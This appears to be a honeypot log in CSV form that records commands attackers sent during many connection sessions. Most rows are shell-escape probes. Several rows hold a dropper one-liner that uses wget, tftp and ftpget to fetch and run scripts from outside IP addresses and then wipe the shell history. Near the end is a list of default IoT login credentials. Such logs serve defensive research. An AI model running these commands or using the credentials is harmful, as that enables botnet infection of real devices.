id,command,connections_id
7816,system,74491
7817,shell,74491
7818,sh,74491
7819,enable,74592
7820,system,74592
7821,shell,74592
7822,sh,74592
7823,enable,74596
7824,system,74596
7825,shell,74596
7826,sh,74596
7827,enable,74597
7828,system,74597
7829,shell,74597
7830,sh,74597
7831,enable,74627
7832,system,74627
7833,shell,74627
7834,sh,74627
7835,enable,74672
7836,enable,74673
7837,system,74672
7838,system,74673
7839,shell,74672
7840,shell,74673
7841,sh,74672
7842,sh,74673
7843,enable,74684
7844,system,74684
7845,shell,74684
7846,sh,74684
7847,enable,74753
7848,system,74753
7849,shell,74753
7850,sh,74753
7851,enable,74834
7852,system,74834
7853,shell,74834
7854,sh,74834
7855,enable,74868
7856,system,74868
7857,shell,74868
7858,sh,74868
7859,enable,74869
7860,system,74869
7861,shell,74869
7862,sh,74869
7863,enable,74891
7864,system,74891
7865,shell,74891
7866,sh,74891
7867,enable,74901
7868,system,74901
7869,shell,74901
7870,sh,74901
7871,enable,74902
7872,system,74902
7873,shell,74902
7874,sh,74902
7875,sh,74903
7876,shell,74903
7877,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",74903
7878,sh,74903
7879,enable,74904
7880,system,74904
7881,shell,74904
7882,sh,74904
7883,enable,74910
7884,system,74910
7885,shell,74910
7886,sh,74910
7887,enable,74973
7888,system,74973
7889,shell,74973
7890,sh,74973
7891,enable,75047
7892,system,75047
7893,shell,75047
7894,sh,75047
7895,enable,75052
7896,system,75052
7897,shell,75052
7898,sh,75052
7899,enable,75059
7900,system,75059
7901,shell,75059
7902,sh,75059
7903,enable,75060
7904,system,75060
7905,shell,75060
7906,sh,75060
7907,enable,75062
7908,system,75062
7909,shell,75062
7910,sh,75062
7911,enable,75134
7912,system,75134
7913,shell,75134
7914,sh,75134
7915,admin,75146
7916,admin,75146
7917,root,75146
7918,zsun1188,75146
7919,enable,75148
7920,system,75148
7921,shell,75148
7922,sh,75148
7923,enable,75267
7924,system,75267
7925,shell,75267
7926,sh,75267
7927,enable,75272
7928,system,75272
7929,shell,75272
7930,sh,75272
7931,enable,75282
7932,system,75282
7933,shell,75282
7934,sh,75282
7935,enable,75396
7936,system,75396
7937,shell,75396
7938,sh,75396
7939,enable,75398
7940,system,75398
7941,shell,75398
7942,sh,75398
7943,enable,75405
7944,system,75405
7945,shell,75405
7946,sh,75405
7947,enable,75476
7948,system,75476
7949,shell,75476
7950,sh,75476
7951,enable,75507
7952,system,75507
7953,shell,75507
7954,sh,75507
7955,enable,75510
7956,system,75510
7957,shell,75510
7958,sh,75510
7959,enable,75511
7960,system,75511
7961,shell,75511
7962,sh,75511
7963,enable,75544
7964,system,75544
7965,shell,75544
7966,sh,75544
7967,enable,75648
7968,system,75648
7969,shell,75648
7970,sh,75648
7971,enable,75737
7972,system,75737
7973,shell,75737
7974,sh,75737
7975,enable,75944
7976,system,75944
7977,shell,75944
7978,sh,75944
7979,enable,75997
7980,system,75997
7981,shell,75997
7982,sh,75997
7983,enable,76007
7984,system,76007
7985,shell,76007
7986,sh,76007
7987,enable,76027
7988,system,76027
7989,shell,76027
7990,sh,76027
7991,enable,76078
7992,system,76078
7993,shell,76078
7994,sh,76078
7995,enable,76127
7996,system,76127
7997,shell,76127
7998,sh,76127
7999,enable,76198
8000,system,76198
8001,shell,76198
8002,sh,76198
8003,enable,76267
8004,system,76267
8005,shell,76267
8006,sh,76267
8007,enable,76268
8008,system,76268
8009,shell,76268
8010,sh,76268
8011,enable,76269
8012,system,76269
8013,shell,76269
8014,sh,76269
8015,enable,76385
8016,system,76385
8017,shell,76385
8018,sh,76385
8019,enable,76407
8020,system,76407
8021,shell,76407
8022,sh,76407
8023,enable,76435
8024,system,76435
8025,shell,76435
8026,sh,76435
8027,enable,76465
8028,system,76465
8029,shell,76465
8030,sh,76465
8031,enable,76512
8032,system,76512
8033,shell,76512
8034,sh,76512
8035,enable,76515
8036,system,76515
8037,shell,76515
8038,sh,76515
8039,enable,76526
8040,system,76526
8041,shell,76526
8042,sh,76526
8043,enable,76789
8044,system,76789
8045,shell,76789
8046,sh,76789
8047,enable,76816
8048,system,76816
8049,shell,76816
8050,sh,76816
8051,enable,76967
8052,enable,76968
8053,system,76967
8054,system,76968
8055,shell,76967
8056,shell,76968
8057,sh,76967
8058,sh,76968
8059,enable,77042
8060,system,77042
8061,shell,77042
8062,sh,77042
8063,enable,77044
8064,system,77044
8065,shell,77044
8066,sh,77044
8067,enable,77045
8068,system,77045
8069,shell,77045
8070,sh,77045
8071,enable,77067
8072,system,77067
8073,shell,77067
8074,sh,77067
8075,enable,77122
8076,system,77122
8077,shell,77122
8078,sh,77122
8079,enable,77164
8080,system,77164
8081,shell,77164
8082,sh,77164
8083,enable,77165
8084,system,77165
8085,shell,77165
8086,sh,77165
8087,enable,77169
8088,system,77169
8089,shell,77169
8090,sh,77169
8091,sh,77183
8092,shell,77183
8093,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",77183
8094,sh,77183
8095,enable,77367
8096,system,77367
8097,shell,77367
8098,sh,77367
8099,enable,78194
8100,system,78194
8101,shell,78194
8102,sh,78194
8103,enable,78225
8104,system,78225
8105,shell,78225
8106,sh,78225
8107,enable,78237
8108,system,78237
8109,shell,78237
8110,sh,78237
8111,enable,78264
8112,system,78264
8113,shell,78264
8114,sh,78264
8115,enable,78265
8116,system,78265
8117,shell,78265
8118,sh,78265
8119,enable,78277
8120,system,78277
8121,shell,78277
8122,sh,78277
8123,enable,78286
8124,system,78286
8125,shell,78286
8126,sh,78286
8127,enable,78301
8128,system,78301
8129,shell,78301
8130,sh,78301
8131,enable,78345
8132,system,78345
8133,shell,78345
8134,sh,78345
8135,enable,78357
8136,system,78357
8137,shell,78357
8138,sh,78357
8139,enable,78366
8140,system,78366
8141,shell,78366
8142,sh,78366
8143,enable,78368
8144,system,78368
8145,shell,78368
8146,sh,78368
8147,enable,78381
8148,system,78381
8149,shell,78381
8150,sh,78381
8151,enable,78384
8152,system,78384
8153,shell,78384
8154,sh,78384
8155,enable,78396
8156,system,78396
8157,shell,78396
8158,sh,78396
8159,enable,78476
8160,system,78476
8161,shell,78476
8162,sh,78476
8163,enable,78477
8164,system,78477
8165,shell,78477
8166,sh,78477
8167,enable,78507
8168,system,78507
8169,shell,78507
8170,sh,78507
8171,enable,78508
8172,system,78508
8173,shell,78508
8174,sh,78508
8175,enable,78558
8176,system,78558
8177,shell,78558
8178,sh,78558
8179,enable,78559
8180,system,78559
8181,shell,78559
8182,sh,78559
8183,enable,78560
8184,system,78560
8185,shell,78560
8186,sh,78560
8187,enable,78562
8188,system,78562
8189,shell,78562
8190,sh,78562
8191,enable,78592
8192,system,78592
8193,shell,78592
8194,sh,78592
8195,enable,78612
8196,system,78612
8197,shell,78612
8198,sh,78612
8199,enable,78686
8200,system,78686
8201,shell,78686
8202,sh,78686
8203,enable,78745
8204,system,78745
8205,shell,78745
8206,sh,78745
8207,enable,78770
8208,system,78770
8209,shell,78770
8210,sh,78770
8211,enable,78810
8212,system,78810
8213,shell,78810
8214,sh,78810
8215,enable,78849
8216,system,78849
8217,shell,78849
8218,sh,78849
8219,enable,78850
8220,system,78850
8221,shell,78850
8222,sh,78850
8223,sh,78856
8224,shell,78856
8225,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",78856
8226,sh,78856
8227,enable,78953
8228,system,78953
8229,shell,78953
8230,sh,78953
8231,enable,79015
8232,system,79015
8233,shell,79015
8234,sh,79015
8235,enable,79061
8236,system,79061
8237,shell,79061
8238,sh,79061
8239,enable,79082
8240,system,79082
8241,shell,79082
8242,sh,79082
8243,enable,79098
8244,system,79098
8245,shell,79098
8246,sh,79098
8247,enable,79121
8248,system,79121
8249,shell,79121
8250,sh,79121
8251,enable,79193
8252,system,79193
8253,shell,79193
8254,sh,79193
8255,enable,79194
8256,system,79194
8257,shell,79194
8258,sh,79194
8259,enable,79241
8260,system,79241
8261,shell,79241
8262,sh,79241
8263,enable,79242
8264,system,79242
8265,shell,79242
8266,sh,79242
8267,enable,79274
8268,system,79274
8269,shell,79274
8270,sh,79274
8271,enable,79282
8272,system,79282
8273,shell,79282
8274,sh,79282
8275,enable,79315
8276,system,79315
8277,shell,79315
8278,sh,79315
8279,enable,79316
8280,system,79316
8281,shell,79316
8282,sh,79316
8283,"%-12345X@PJL INFO ID",79367
8284,"%-12345X",79367
8285,enable,79369
8286,system,79369
8287,shell,79369
8288,sh,79369
8289,enable,79398
8290,system,79398
8291,shell,79398
8292,sh,79398
8293,enable,79450
8294,system,79450
8295,shell,79450
8296,sh,79450
8297,enable,79482
8298,system,79482
8299,shell,79482
8300,sh,79482
8301,enable,79483
8302,enable,79484
8303,system,79483
8304,system,79484
8305,shell,79483
8306,shell,79484
8307,sh,79483
8308,sh,79484
8309,sh,79513
8310,shell,79513
8311,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",79513
8312,sh,79513
8313,enable,79529
8314,system,79529
8315,shell,79529
8316,sh,79529
8317,enable,79540
8318,system,79540
8319,shell,79540
8320,sh,79540
8321,sh,79561
8322,shell,79561
8323,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",79561
8324,sh,79561
8325,enable,79563
8326,system,79563
8327,shell,79563
8328,sh,79563
8329,enable,79608
8330,system,79608
8331,shell,79608
8332,sh,79608
8333,enable,79619
8334,system,79619
8335,shell,79619
8336,sh,79619
8337,enable,79620
8338,system,79620
8339,shell,79620
8340,sh,79620
8341,enable,79631
8342,system,79631
8343,shell,79631
8344,sh,79631
8345,enable,79649
8346,system,79649
8347,shell,79649
8348,sh,79649
8349,enable,79668
8350,system,79668
8351,shell,79668
8352,sh,79668
8353,enable,79669
8354,system,79669
8355,shell,79669
8356,sh,79669
8357,enable,79671
8358,system,79671
8359,shell,79671
8360,sh,79671
8361,enable,79672
8362,system,79672
8363,shell,79672
8364,sh,79672
8365,enable,79673
8366,system,79673
8367,shell,79673
8368,sh,79673
8369,enable,79674
8370,system,79674
8371,shell,79674
8372,sh,79674
8373,enable,79675
8374,system,79675
8375,shell,79675
8376,sh,79675
8377,enable,79676
8378,system,79676
8379,shell,79676
8380,sh,79676
8381,enable,79677
8382,system,79677
8383,shell,79677
8384,sh,79677
8385,enable,79678
8386,system,79678
8387,shell,79678
8388,sh,79678
8389,enable,79679
8390,system,79679
8391,shell,79679
8392,sh,79679
8393,enable,79908
8394,system,79908
8395,shell,79908
8396,sh,79908
8397,enable,79914
8398,enable,79915
8399,system,79914
8400,system,79915
8401,shell,79914
8402,shell,79915
8403,sh,79914
8404,sh,79915
8405,"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36",79932
8406,enable,79942
8407,system,79942
8408,shell,79942
8409,sh,79942
8410,enable,79944
8411,system,79944
8412,shell,79944
8413,sh,79944
8414,enable,79946
8415,system,79946
8416,shell,79946
8417,sh,79946
8418,enable,79964
8419,system,79964
8420,shell,79964
8421,sh,79964
8422,enable,80008
8423,system,80008
8424,shell,80008
8425,sh,80008
8426,enable,80027
8427,system,80027
8428,shell,80027
8429,sh,80027
8430,enable,80054
8431,system,80054
8432,shell,80054
8433,sh,80054
8434,enable,80108
8435,system,80108
8436,shell,80108
8437,sh,80108
8438,enable,80244
8439,system,80244
8440,shell,80244
8441,sh,80244
8442,enable,80248
8443,system,80248
8444,shell,80248
8445,sh,80248
8446,enable,80284
8447,system,80284
8448,shell,80284
8449,sh,80284
8450,enable,80325
8451,system,80325
8452,shell,80325
8453,sh,80325
8454,enable,80334
8455,system,80334
8456,shell,80334
8457,sh,80334
8458,enable,80398
8459,system,80398
8460,shell,80398
8461,sh,80398
8462,enable,80413
8463,system,80413
8464,shell,80413
8465,sh,80413
8466,enable,80509
8467,system,80509
8468,shell,80509
8469,sh,80509
8470,enable,80511
8471,system,80511
8472,shell,80511
8473,sh,80511
8474,enable,80526
8475,system,80526
8476,shell,80526
8477,sh,80526
8478,enable,80531
8479,system,80531
8480,shell,80531
8481,sh,80531
8482,enable,80552
8483,system,80552
8484,shell,80552
8485,sh,80552
8486,enable,80563
8487,system,80563
8488,shell,80563
8489,sh,80563
8490,enable,80603
8491,system,80603
8492,shell,80603
8493,sh,80603
8494,enable,80604
8495,system,80604
8496,shell,80604
8497,sh,80604
8498,sh,80655
8499,shell,80655
8500,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",80655
8501,sh,80655
8502,enable,80656
8503,system,80656
8504,shell,80656
8505,sh,80656
8506,enable,80729
8507,system,80729
8508,shell,80729
8509,sh,80729
8510,enable,80730
8511,system,80730
8512,shell,80730
8513,sh,80730
8514,enable,80749
8515,system,80749
8516,shell,80749
8517,sh,80749
8518,enable,80751
8519,system,80751
8520,shell,80751
8521,sh,80751
8522,enable,80776
8523,enable,80777
8524,system,80776
8525,system,80777
8526,shell,80776
8527,shell,80777
8528,sh,80776
8529,sh,80777
8530,enable,80806
8531,system,80806
8532,shell,80806
8533,sh,80806
8534,enable,80807
8535,system,80807
8536,shell,80807
8537,sh,80807
8538,enable,81004
8539,system,81004
8540,shell,81004
8541,sh,81004
8542,root,81017
8543,ikwb,81017
8544,root,81017
8545,aquario,81017
8546,enable,81018
8547,system,81018
8548,shell,81018
8549,sh,81018
8550,enable,81112
8551,system,81112
8552,shell,81112
8553,sh,81112
8554,enable,81146
8555,system,81146
8556,shell,81146
8557,sh,81146
8558,enable,81147
8559,system,81147
8560,shell,81147
8561,sh,81147
8562,enable,81159
8563,system,81159
8564,shell,81159
8565,sh,81159
8566,enable,81181
8567,system,81181
8568,shell,81181
8569,sh,81181
8570,enable,81196
8571,system,81196
8572,shell,81196
8573,sh,81196
8574,enable,81203
8575,system,81203
8576,shell,81203
8577,sh,81203
8578,enable,81205
8579,system,81205
8580,shell,81205
8581,sh,81205
8582,enable,81208
8583,system,81208
8584,shell,81208
8585,sh,81208
8586,enable,81249
8587,system,81249
8588,shell,81249
8589,sh,81249
8590,enable,81250
8591,system,81250
8592,shell,81250
8593,sh,81250
8594,enable,81255
8595,system,81255
8596,shell,81255
8597,sh,81255
8598,enable,81338
8599,system,81338
8600,shell,81338
8601,sh,81338
8602,enable,81342
8603,system,81342
8604,shell,81342
8605,sh,81342
8606,enable,81367
8607,system,81367
8608,shell,81367
8609,sh,81367
8610,enable,81378
8611,system,81378
8612,shell,81378
8613,sh,81378
8614,enable,81379
8615,system,81379
8616,shell,81379
8617,sh,81379
8618,enable,81445
8619,system,81445
8620,shell,81445
8621,sh,81445
8622,sh,81557
8623,shell,81557
8624,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",81557
8625,sh,81557
8626,enable,81627
8627,system,81627
8628,shell,81627
8629,sh,81627
8630,enable,81630
8631,system,81630
8632,shell,81630
8633,sh,81630
8634,enable,81651
8635,system,81651
8636,shell,81651
8637,sh,81651
8638,enable,81654
8639,system,81654
8640,shell,81654
8641,sh,81654
8642,enable,81701
8643,system,81701
8644,shell,81701
8645,sh,81701
8646,enable,81704
8647,system,81704
8648,shell,81704
8649,sh,81704
8650,enable,81727
8651,system,81727
8652,shell,81727
8653,sh,81727
8654,enable,81737
8655,system,81737
8656,shell,81737
8657,sh,81737
8658,enable,81986
8659,system,81986
8660,shell,81986
8661,sh,81986
8662,enable,82540
8663,system,82540
8664,shell,82540
8665,sh,82540
8666,enable,82684
8667,system,82684
8668,shell,82684
8669,sh,82684
8670,enable,82689
8671,system,82689
8672,shell,82689
8673,sh,82689
8674,enable,82690
8675,system,82690
8676,shell,82690
8677,sh,82690
8678,enable,82786
8679,system,82786
8680,shell,82786
8681,sh,82786
8682,enable,82808
8683,system,82808
8684,shell,82808
8685,sh,82808
8686,enable,82824
8687,system,82824
8688,shell,82824
8689,sh,82824
8690,enable,82836
8691,system,82836
8692,shell,82836
8693,sh,82836
8694,enable,82860
8695,system,82860
8696,shell,82860
8697,sh,82860
8698,enable,82871
8699,enable,82872
8700,system,82871
8701,system,82872
8702,shell,82871
8703,shell,82872
8704,sh,82871
8705,sh,82872
8706,enable,82911
8707,system,82911
8708,shell,82911
8709,sh,82911
8710,enable,82921
8711,system,82921
8712,shell,82921
8713,sh,82921
8714,sh,82942
8715,shell,82942
8716,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",82942
8717,sh,82942
8718,enable,83077
8719,system,83077
8720,shell,83077
8721,sh,83077
8722,sh,83144
8723,shell,83144
8724,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",83144
8725,sh,83144
8726,enable,83146
8727,system,83146
8728,shell,83146
8729,sh,83146
8730,enable,83169
8731,system,83169
8732,shell,83169
8733,sh,83169
8734,enable,83205
8735,system,83205
8736,shell,83205
8737,sh,83205
8738,enable,83256
8739,system,83256
8740,shell,83256
8741,sh,83256
8742,enable,83359
8743,system,83359
8744,shell,83359
8745,sh,83359
8746,enable,83404
8747,system,83404
8748,shell,83404
8749,sh,83404
8750,enable,83431
8751,system,83431
8752,shell,83431
8753,sh,83431
8754,enable,83541
8755,system,83541
8756,shell,83541
8757,sh,83541
8758,sh,83562
8759,shell,83562
8760,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",83562
8761,sh,83562
8762,enable,83596
8763,system,83596
8764,shell,83596
8765,sh,83596
8766,enable,83611
8767,system,83611
8768,shell,83611
8769,sh,83611
8770,"Accept: */*",83627
8771,enable,83724
8772,system,83724
8773,shell,83724
8774,sh,83724
8775,enable,83787
8776,system,83787
8777,shell,83787
8778,sh,83787
8779,"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36",83799
8780,"Accept: */*",83799
8781,"cd /tmp || cd /run || cd /; wget http://185.244.25.113/SjkDbins.sh; chmod 777 SjkDbins.sh; sh SjkDbins.sh; tftp 185.244.25.113 -c get SjkDtftp1.sh; chmod 777 SjkDtftp1.sh; sh SjkDtftp1.sh; tftp -r SjkDtftp2.sh -g 185.244.25.113; chmod 777 SjkDtftp2.sh; sh SjkDtftp2.sh; rm -rf SjkDbins.sh SjkDtftp1.sh SjkDtftp2.sh; rm -rf *",83810
8782,enable,83842
8783,system,83842
8784,shell,83842
8785,sh,83842
8786,enable,83914
8787,system,83914
8788,shell,83914
8789,sh,83914
8790,enable,83988
8791,system,83988
8792,shell,83988
8793,sh,83988
8794,enable,84003
8795,system,84003
8796,shell,84003
8797,sh,84003
8798,enable,84035
8799,system,84035
8800,shell,84035
8801,sh,84035
8802,enable,84113
8803,system,84113
8804,shell,84113
8805,sh,84113
8806,enable,84243
8807,system,84243
8808,shell,84243
8809,sh,84243
8810,enable,84296
8811,system,84296
8812,shell,84296
8813,sh,84296
8814,enable,84309
8815,system,84309
8816,shell,84309
8817,sh,84309
8818,enable,84314
8819,system,84314
8820,shell,84314
8821,sh,84314
8822,enable,84359
8823,system,84359
8824,shell,84359
8825,sh,84359
8826,enable,84428
8827,system,84428
8828,shell,84428
8829,sh,84428
8830,enable,84474
8831,system,84474
8832,shell,84474
8833,sh,84474
8834,enable,84594
8835,system,84594
8836,shell,84594
8837,sh,84594
8838,enable,84627
8839,system,84627
8840,shell,84627
8841,sh,84627
8842,enable,84629
8843,system,84629
8844,shell,84629
8845,sh,84629
8846,enable,84659
8847,system,84659
8848,shell,84659
8849,sh,84659
8850,enable,84661
8851,system,84661
8852,shell,84661
8853,sh,84661
8854,enable,84746
8855,system,84746
8856,shell,84746
8857,sh,84746
8858,enable,84753
8859,system,84753
8860,shell,84753
8861,sh,84753
8862,enable,84812
8863,system,84812
8864,shell,84812
8865,sh,84812
8866,sh,84892
8867,shell,84892
8868,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",84892
8869,sh,84892
8870,enable,84894
8871,system,84894
8872,shell,84894
8873,sh,84894
8874,enable,84899
8875,system,84899
8876,shell,84899
8877,sh,84899
8878,sh,84900
8879,shell,84900
8880,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",84900
8881,sh,84900
8882,enable,84928
8883,system,84928
8884,shell,84928
8885,sh,84928
8886,root,84930
8887,ikwb,84930
8888,root,84930
8889,54321,84930
8890,Administrator,84931
8891,admin,84931
8892,root,84931
8893,admin,84932
8894,Win1doW$,84932
8895,root,84932
8896,klv123,84932
8897,root,84933
8898,zlxx.,84933
8899,root,84933
8900,hunt5759,84933
8901,root,84934
8902,00000000,84934
8903,root,84934
8904,realtek,84934
8905,admin,84935
8906,12345,84935
8907,root,84935
8908,juantech,84935
8909,root,84936
8910,1234567890,84936
8911,mother,84936
8912,fucker,84936
8913,administrator,84937
8914,1234,84937
8915,root,84937
8916,pass,84937
8917,root,84938
8918,qazxsw,84938
8919,supervisor,84938
8920,supervisor,84938
8921,enable,84939
8922,system,84939
8923,shell,84939
8924,sh,84939
8925,enable,84940
8926,system,84940
8927,shell,84940
8928,sh,84940
8929,enable,85091
8930,system,85091
8931,shell,85091
8932,sh,85091
8933,enable,85159
8934,system,85159
8935,shell,85159
8936,sh,85159
8937,enable,85187
8938,system,85187
8939,shell,85187
8940,sh,85187
8941,enable,85252
8942,system,85252
8943,shell,85252
8944,sh,85252
8945,enable,85274
8946,system,85274
8947,shell,85274
8948,sh,85274
8949,enable,87407
8950,system,87407
8951,shell,87407
8952,sh,87407
8953,enable,87519
8954,system,87519
8955,shell,87519
8956,sh,87519
8957,enable,87520
8958,system,87520
8959,shell,87520
8960,sh,87520
8961,enable,87522
8962,system,87522
8963,shell,87522
8964,sh,87522
8965,enable,87532
8966,system,87532
8967,shell,87532
8968,sh,87532
8969,enable,87592
8970,system,87592
8971,shell,87592
8972,sh,87592
8973,enable,87593
8974,system,87593
8975,shell,87593
8976,sh,87593
8977,enable,87623
8978,system,87623
8979,shell,87623
8980,sh,87623
8981,enable,87655
8982,system,87655
8983,shell,87655
8984,sh,87655
8985,enable,87688
8986,system,87688
8987,shell,87688
8988,sh,87688
8989,enable,87701
8990,system,87701
8991,shell,87701
8992,sh,87701
8993,enable,87732
8994,system,87732
8995,shell,87732
8996,sh,87732
8997,enable,87735
8998,system,87735
8999,shell,87735
9000,sh,87735
9001,enable,87746
9002,system,87746
9003,shell,87746
9004,sh,87746
9005,enable,87769
9006,system,87769
9007,shell,87769
9008,sh,87769
9009,enable,87770
9010,system,87770
9011,shell,87770
9012,sh,87770
9013,enable,87787
9014,system,87787
9015,shell,87787
9016,sh,87787
9017,enable,87795
9018,system,87795
9019,shell,87795
9020,sh,87795
9021,enable,87847
